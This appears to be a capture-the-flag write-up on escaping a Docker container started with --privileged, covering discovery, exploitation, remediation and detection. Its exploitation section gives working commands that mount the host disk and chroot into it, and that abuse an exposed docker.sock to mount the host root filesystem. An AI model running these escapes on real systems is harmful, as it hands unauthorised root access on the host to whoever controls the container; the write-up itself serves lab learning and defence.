# Privileged Docker Container Escape

*Reference: [Linux Docker Container Escapes Cheatsheet](https://medium.com/@indigoshadowwashere/linux-docker-container-escapes-cheatsheet-49e47f21e27a) by Indigo Shadow — a solid summary of the common escape techniques, used here as the primary research source for this write-up.*

## Vulnerability

The container is launched with the `--privileged` flag:

```bash
docker run --privileged -it ubuntu:latest bash
```

`--privileged` strips away Docker's default sandboxing almost entirely — instead of the ~14 capabilities a container normally gets, it's granted **every** Linux capability, along with direct access to host devices. In practice this makes the container's isolation from the host mostly cosmetic — any process with root inside the container also has, functionally, most of what it needs to reach the host.

The specific capability that matters most for escape here is `cap_sys_admin` — often described as Linux's "super-capability," since it grants access to mount operations, kernel features, and device access without further restriction.

## Discovery

Confirm you're actually inside a container first:

```bash
ls -la /        # look for .dockerenv
cat /proc/1/cgroup   # 'docker' in the paths is a strong signal
```

Then check what capabilities you've been handed:

```bash
capsh --print | grep cap_sys_admin

# if capsh isn't available, check the raw bitmask instead
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff means every capability is granted
```

Also worth checking for an exposed Docker socket, since a privileged container often has one mounted too, and it's an even more direct escape route:

```bash
find / -name "docker.sock" 2>/dev/null
```

## Exploitation

With `cap_sys_admin`, the most direct escape is mounting the host's own filesystem into the container and `chroot`-ing into it:

```bash
# identify the host disk — usually the largest, bootable device
fdisk -l

# mount it and pivot into it
mkdir /mnt
mount /dev/nvme0n1p1 /mnt
chroot /mnt /bin/bash

# now operating with the host filesystem as root
cat /root/flag.txt
```

If a docker socket is exposed instead, the escape is even simpler — use the socket to have the host's Docker daemon spin up a *new* container with the entire host filesystem mounted in:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
```

Either path ends the same way: full read/write access to the host filesystem from what was supposed to be an isolated container.

## Remediation

- **Never run containers with `--privileged` in production.** It exists mainly for edge cases (nested Docker, certain hardware access) — if a workload genuinely needs elevated access, grant only the specific capability required (`--cap-add=SYS_ADMIN`, etc.) rather than all of them.
- **Never mount the host's `docker.sock` into a container** unless that container is fully trusted — it is equivalent to giving the container root on the host, since it can just ask the host daemon to do anything, including spinning up a new privileged container.
- **Apply the principle of least privilege to capabilities specifically** — Docker's default capability set (`CAP_CHOWN`, `CAP_NET_BIND_SERVICE`, etc.) is already scoped down; adding capabilities back, or reverting to `--privileged`, should require explicit justification per container.
- **Run containers with a restrictive seccomp/AppArmor profile** — `--privileged` typically disables both, and they provide a second layer of defense even against capability misuse.
- **Don't share host namespaces (`--pid=host`, `--net=host`, etc.) unless required** — even without full privilege, a shared PID namespace lets a compromised container reach host processes via tools like `nsenter`.

## Detection (blue team side)

- Audit running containers for `--privileged` or added capabilities: `docker inspect <container> | grep -i privileged`.
- Flag any container with `docker.sock` bind-mounted from the host.
- Monitor for `mount`, `chroot`, or `insmod` calls originating from inside a container context — these are not normal container behavior and are strong indicators of an active escape attempt.

---

## Gaps worth adding to this note

1. **Which technique actually applied on this specific challenge** — this note currently documents the *general* privileged-container escape pattern from the reference cheatsheet rather than the exact commands/output from the "I am groot" box itself. Worth going back and filling in the actual capability check output and exploitation commands once you have them, so this reads consistently with your other write-ups (which use real target output).
2. **`cap_sys_ptrace` and `cap_sys_module` variants** — the reference article covers process-injection and kernel-module-loading escapes too; worth a short "see also" note distinguishing them, since a privileged container technically has all three capabilities available, not just `cap_sys_admin`.
3. **cgroup `release_agent` abuse** — a subtler `cap_sys_admin` technique (vs. the direct mount approach used here) that's worth a one-line cross-reference, since it comes up on boxes where the host filesystem device isn't directly mountable.
4. **Automated enumeration tools** — the source article mentions `deepce` and `linpeas` for spotting these misconfigurations quickly; worth naming as the "don't do this by hand every time" tooling note.
